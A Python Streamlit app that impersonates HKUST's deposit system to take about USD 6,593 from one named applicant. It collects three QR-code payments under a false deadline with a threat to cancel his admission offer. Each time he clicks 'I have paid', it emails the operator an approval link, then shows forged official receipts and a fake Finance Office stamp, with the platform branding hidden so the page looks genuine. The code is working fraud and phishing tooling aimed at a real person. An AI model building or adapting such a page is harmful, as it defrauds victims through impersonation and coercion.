import streamlit as st
from datetime import datetime
import time
import os
import requests

# --- 1. Page Config & CSS ---
st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")

STATUS_FILE = "payment_status.txt"

def set_status(status):
    with open(STATUS_FILE, "w") as f: f.write(status)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

# 管理員從郵件點擊審核的處理 (action=approve1, 2, 3)
query_params = st.query_params
action = query_params.get("action")
if action in ["approve1", "approve2", "approve3"]:
    set_status(action.replace("approve", "approved"))
    st.success(f"Stage {action[-1]} Approved! User screen will update.")
    st.stop()

st.markdown("""
<style>
    #MainMenu, header, footer, .stDeployButton {visibility: hidden !important;}
    [data-testid="stHeader"] {display: none !important;}
    .nav-bar { background-color: #003366; padding: 15px 60px; display: flex; align-items: center; color: white; border-bottom: 4px solid #A6937C; }
    .loader { border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    
    .payment-card { background: white; padding: 30px; border-radius: 10px; border: 1px solid #ddd; color: #000 !important; }
    .info-box { background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }
    
    /* 紅色截止日期提醒框 */
    .deadline-box { 
        color: #d32f2f !important; font-weight: bold; font-size: 15px; 
        background-color: #f8d7da !important; padding: 18px; 
        border-radius: 4px; margin: 15px 0; border: 1px solid #f5c6cb;
        line-height: 1.5;
    }
    .receipt-box { background: white; border: 1px solid #003366; padding: 30px; border-radius: 5px; color: #000 !important; }
</style>
""", unsafe_allow_html=True)

# --- 2. Data Definitions ---
PAYER = "XINGSHENG WANG (王兴生)"
HKD_TOTAL = "51,643"
USD_TOTAL = "6,593.21"

# EmailJS 配置 (請在此填入您的 Key)
USER_ID = "您的_Public_Key"
SERVICE_ID = "您的_Service_ID"
TEMPLATE_ID = "您的_Template_ID"
MY_URL = "https://streamlit.app" # 您的 Streamlit 網址

# --- 3. UI State ---
if 'step' not in st.session_state: st.session_state.step = "pay1"

# 頂部導航欄
st.markdown(f"""<div class="nav-bar"><img src="https://hkust.edu.hk" height="45"><div style="margin-left:15px; border-left:2px solid #fff; padding-left:15px; font-size:18px;">Deposit System</div></div>""", unsafe_allow_html=True)

# --- 4. Logic Flow ---

# --- 通用 Checking 頁面邏輯 ---
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""<div style="text-align:center; margin-top:100px;"><div class="loader"></div><h2 style="color:#003366;">Verifying Installment {stage}...</h2><p>Our team is verifying your Payoneer transaction. This page will update automatically.</p></div>""", unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}":
        st.session_state.step = f"receipt{stage}"
    st.rerun()

# --- 階段 1: 支付 1200 USD ---
elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""
        <div class="payment-card">
            <h3 style="color:#003366; margin-top:0;">Secure Payment Portal</h3>
            <p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
            <p>Your deposit of <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>) will be split into 3 installments into your campus account.</p>
            <div class="info-box"><b>Installment Plan:</b> 1st: $1,200 | 2nd: $3,000 | 3rd: $2,393.21</div>
            
            <div class="deadline-box">
                ⚠️ URGENT NOTICE:<br>
                Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer and your place in the MSc in TLE program.
            </div>
            
            <p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current: 1st Installment - USD 1,200.00</p>
        </div>
        """, unsafe_allow_html=True)
        st.image("qr1.png", width=350)
        if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
            set_status("checking1"); st.session_state.step = "checking1"; st.rerun()

# --- 階段 1 收據 & 跳轉 2 ---
elif st.session_state.step == "receipt1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="receipt-box"><h4 style="text-align:center;">OFFICIAL RECEIPT (STAGE 1)</h4><p><b>Payer:</b> {PAYER}</p><p><b>Received:</b> USD 1,200.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold;">VERIFIED</div></div>""", unsafe_allow_html=True)
        if st.button("PROCEED TO 2ND INSTALLMENT (USD 3,000)", use_container_width=True, type="primary"):
            st.session_state.step = "pay2"; st.rerun()

# --- 階段 2: 支付 3000 USD ---
elif st.session_state.step == "pay2":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""
        <div class="payment-card">
            <h3 style="color:#003366; margin-top:0;">2nd Installment Payment</h3>
            <p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
            <div class="deadline-box">⚠️ Reminder: Deadline is 4:00 PM on April 24th.</div>
            <p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 3,000.00</p>
        </div>
        """, unsafe_allow_html=True)
        st.image("qr2.png", width=350)
        if st.button("I HAVE PAID THE 2ND INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 3000", "approve_url": f"{MY_URL}/?action=approve2"}})
            set_status("checking2"); st.session_state.step = "checking2"; st.rerun()

# --- 階段 2 收據 & 跳轉 3 ---
elif st.session_state.step == "receipt2":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="receipt-box"><h4 style="text-align:center;">OFFICIAL RECEIPT (STAGE 2)</h4><p><b>Payer:</b> {PAYER}</p><p><b>Received:</b> USD 3,000.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold;">VERIFIED</div></div>""", unsafe_allow_html=True)
        if st.button("PROCEED TO FINAL INSTALLMENT (USD 2,393.21)", use_container_width=True, type="primary"):
            st.session_state.step = "pay3"; st.rerun()

# --- 階段 3: 支付 2393.21 USD ---
elif st.session_state.step == "pay3":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""
        <div class="payment-card">
            <h3 style="color:#003366; margin-top:0;">Final Installment Payment</h3>
            <p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
            <div class="deadline-box">⚠️ Final Step: Complete this to secure your enrollment.</div>
            <p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 2,393.21</p>
        </div>
        """, unsafe_allow_html=True)
        st.image("qr3.png", width=350)
        if st.button("I HAVE PAID THE FINAL INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 2393.21", "approve_url": f"{MY_URL}/?action=approve3"}})
            set_status("checking3"); st.session_state.step = "checking3"; st.rerun()

# --- 最終正式大收據 ---
elif st.session_state.step == "receipt3":
    st.markdown(f"""
    <div style="background:white; border:2px solid #003366; padding:40px; max-width:750px; margin:auto; position:relative;">
        <div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
            <h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
            <p style="font-size:11px; color:#666 !important;">Finance Office | Official Receipt</p>
        </div>
        <h3 style="text-align:center; text-decoration: underline;">FULL PROGRAM DEPOSIT RECEIPT</h3>
        <br>
        <table style="width:100%; color:#000;">
            <tr><td><b>Receipt No:</b></td><td style="text-align:right;">UST-FULL-{int(time.time())}</td></tr>
            <tr><td><b>Date:</b></td><td style="text-align:right;">{datetime.now().strftime('%d %B %Y')}</td></tr>
            <tr><td><b>Received from:</b></td><td style="text-align:right;">{PAYER}</td></tr>
            <tr><td><b>Total Amount:</b></td><td style="text-align:right;"><b>HK$ {HKD_TOTAL} (USD {USD_TOTAL})</b></td></tr>
        </table>
        <br>
        <div style="border:2px solid #d32f2f; color:#d32f2f; padding:8px; width:fit-content; transform:rotate(-5deg); font-weight:bold; margin-top:20px;">HKUST FINANCE OFFICE<br>FULL PAYMENT VERIFIED</div>
    </div>
    """, unsafe_allow_html=True)
    st.balloons()

st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
